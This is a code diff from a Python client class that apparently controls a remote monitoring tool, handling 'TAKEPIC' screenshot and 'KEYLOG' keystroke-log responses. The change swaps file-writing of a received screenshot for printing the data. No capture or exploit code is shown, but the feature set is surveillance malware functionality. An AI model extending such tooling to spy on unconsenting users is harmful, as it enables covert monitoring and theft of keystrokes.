@@ -104,7 +104,8 @@ class Client:
             # tk.Label(self.root, text=data).pack()
         elif res == "TAKEPIC":
             # Receive image data from the server
-            #data = self.receive_data()
+            data = self.receive_data()
+            print(data)
             # self.gui.ScreenshotScene
             # gui.GUI.ScreenshotScene
             # size = int(self.Cli_Sock.recv(10).decode('utf-8'))
@@ -119,14 +120,7 @@ class Client:
             # Display data in a tkinter widget
             # tk.Label(self.root, text=data).pack()
             # Receive file
-            filename = "screenshot.png"
-            with open(filename, 'wb') as fw:
-                while True:
-                    data = self.Cli_Sock.recv(1024)
-                    if not data:
-                        break
-                    fw.write(data)
-                fw.close()                    
+               
         elif res == "KEYLOG":
             data = self.receive_data()
             # self.gui.keystrokeScene
